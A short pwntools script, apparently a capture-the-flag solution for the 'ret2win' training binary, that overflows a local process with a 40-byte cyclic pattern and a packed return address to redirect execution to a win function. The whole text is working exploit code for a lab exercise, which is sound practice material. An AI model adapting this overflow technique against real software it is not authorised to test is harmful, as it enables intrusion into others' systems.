from pwn import *
context.log_level = 'DEBUG'
r = process("./ret2win")
r.recv()
r.write(cyclic(40)+p64(0x0000000000400756))
r.recv()
